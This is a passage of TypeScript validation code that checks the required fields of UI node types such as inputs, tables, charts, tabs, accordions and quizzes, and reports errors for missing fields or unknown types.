    case 'input': case 'textarea':
      isStr('label'); isStr('placeholder'); isStr('value')
      break
    case 'select': case 'radio':
      if (!Array.isArray(v.options)) errors.push(`${at}: type '${type}' requires options (array)`)
      break
    case 'submit':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'submit' requires label (string)`)
      // action is optional (local grading needs no round trip); the
      // renderer disables the button when it is absent AND no question
      // carries local `answer` data.
      break
    case 'badge':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'badge' requires label (string)`)
      isStr('label')
      break
    case 'stat':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'stat' requires label (string)`)
      if (typeof v.value !== 'string') errors.push(`${at}: type 'stat' requires value (string)`)
      isStr('delta')
      break
    case 'progress':
      if (typeof v.value !== 'number' || !Number.isFinite(v.value) || (v.value as number) < 0 || (v.value as number) > 100) {
        errors.push(`${at}: type 'progress' requires value (number 0..100)`)
      }
      isNum('value')
      break
    case 'avatar':
      if (typeof v.name !== 'string') errors.push(`${at}: type 'avatar' requires name (string)`)
      break
    case 'list':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'list' requires items (array)`)
      break
    case 'table':
      if (!Array.isArray(v.columns)) errors.push(`${at}: type 'table' requires columns (array)`)
      if (!Array.isArray(v.rows)) errors.push(`${at}: type 'table' requires rows (array)`)
      break
    case 'chart':
      if (!Array.isArray(v.data) && !Array.isArray(v.series)) errors.push(`${at}: type 'chart' requires data or series (array)`)
      break
    case 'tabs': {
      if (!Array.isArray(v.tabs)) errors.push(`${at}: type 'tabs' requires tabs (array)`)
      if (Array.isArray(v.tabs)) {
        for (let i = 0; i < v.tabs.length; i++) {
          const t = obj(v.tabs[i])
          if (t === undefined) { errors.push(`${at}.tabs[${i}] must be an object`); continue }
          if (typeof t.label !== 'string') errors.push(`${at}.tabs[${i}].label must be a string`)
          walk(t.items, depth + 1, `${at}.tabs[${i}].items`)
        }
      }
      break
    }
    case 'plot':
      if (!Array.isArray(v.series)) errors.push(`${at}: type 'plot' requires series (array)`)
      break
    case 'callout':
      if (typeof v.content !== 'string') errors.push(`${at}: type 'callout' requires content (string)`)
      break
    case 'steps':
      if (!Array.isArray(v.steps)) errors.push(`${at}: type 'steps' requires steps (array)`)
      break
    case 'keyvalue':
      if (!Array.isArray(v.pairs)) errors.push(`${at}: type 'keyvalue' requires pairs (array)`)
      break
    case 'diff':
      if (!Array.isArray(v.diffs)) errors.push(`${at}: type 'diff' requires diffs (array)`)
      break
    case 'json':
      if (!('value' in v)) errors.push(`${at}: type 'json' requires value`)
      break
    case 'code':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'code' requires code (string)`)
      break
    case 'accordion':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'accordion' requires items (array)`)
      if (Array.isArray(v.items)) {
        for (let i = 0; i < v.items.length; i++) {
          const item = obj(v.items[i])
          if (item === undefined) { errors.push(`${at}.items[${i}] must be an object`); continue }
          if (typeof item.title !== 'string') errors.push(`${at}.items[${i}].title must be a string`)
          walk(item.items, depth + 1, `${at}.items[${i}].items`)
        }
      }
      break
    case 'copy':
      if (typeof v.text !== 'string') errors.push(`${at}: type 'copy' requires text (string)`)
      break
    case 'mermaid':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'mermaid' requires code (string)`)
      break
    case 'scene3d':
      if (!Array.isArray(v.meshes)) errors.push(`${at}: type 'scene3d' requires meshes (array)`)
      break
    case 'timeline':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'timeline' requires items (array)`)
      break
    case 'file-tree':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'file-tree' requires items (array)`)
      break
    case 'breadcrumb':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'breadcrumb' requires items (array)`)
      break
    case 'quiz':
      if (typeof v.question !== 'string') errors.push(`${at}: type 'quiz' requires question (string)`)
      if (!Array.isArray(v.options)) errors.push(`${at}: type 'quiz' requires options (array)`)
      break
    default:
      // Unknown type: plugin-registered custom nodes are valid when a
      // renderer exists; the guard cannot know, so report as a warning.
      errors.push(`${at}: unknown type '${type}' (custom renderer?)`)
  }
}
